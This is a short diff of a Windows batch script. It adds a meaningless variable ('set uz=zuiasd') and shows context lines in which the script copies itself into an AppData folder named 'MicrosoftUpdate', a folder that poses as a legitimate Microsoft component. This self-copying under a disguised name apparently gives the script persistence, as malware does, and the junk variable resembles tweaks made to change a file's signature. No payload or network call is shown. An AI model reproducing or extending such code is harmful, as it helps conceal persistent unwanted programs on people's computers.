@@ -1,6 +1,8 @@
 @echo off
 cls
 
+set uz=zuiasd
+
 if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
 mkdir "%APPDATA%/MicrosoftUpdate/"
 copy /y %~f0 "%AppData%\MicrosoftUpdate\"
